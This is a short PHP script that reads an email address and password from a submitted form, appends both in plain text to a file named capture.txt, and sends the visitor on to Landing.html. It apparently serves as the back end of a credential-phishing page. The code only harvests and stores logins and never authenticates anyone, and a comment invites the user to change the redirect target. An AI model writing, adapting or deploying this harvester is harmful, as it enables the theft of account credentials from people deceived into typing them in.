<?php
    
    // Capture form data
    $email = $_POST['email'];
    $pass = $_POST['pwd'];

    // Prepare data to be written to the file
    $data = "Email: " . $email . "\n" . "Password: " . $pass . "\n\n";

    // Define the file path
    $file = 'capture.txt';

    // Open the file for appending
    $fileHandle = fopen($file, 'a');

    if ($fileHandle) {
        // Write the data to the file
        fwrite($fileHandle, $data);
        fclose($fileHandle);

        // Redirect to a different HTML page after submission
        header("Location: Landing.html");  // Change to your desired HTML page
        exit(); // Make sure no further code is executed
    } else {
        echo "Unable to open the file.";
    }
?>
